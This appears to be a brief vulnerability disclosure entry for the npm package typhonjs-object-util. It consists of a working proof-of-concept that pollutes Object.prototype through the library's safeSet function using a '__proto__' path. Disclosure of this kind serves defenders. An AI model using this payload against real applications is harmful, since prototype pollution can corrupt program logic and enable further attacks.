# typhonjs-object-util

- package name: typhonjs-object-util

- PoC exploit: 

```javascript
var util = require('typhonjs-object-util');
util.default.safeSet({}, '__proto__.polluted', 'yes');

// Object.prototype.polluted === 'yes'
```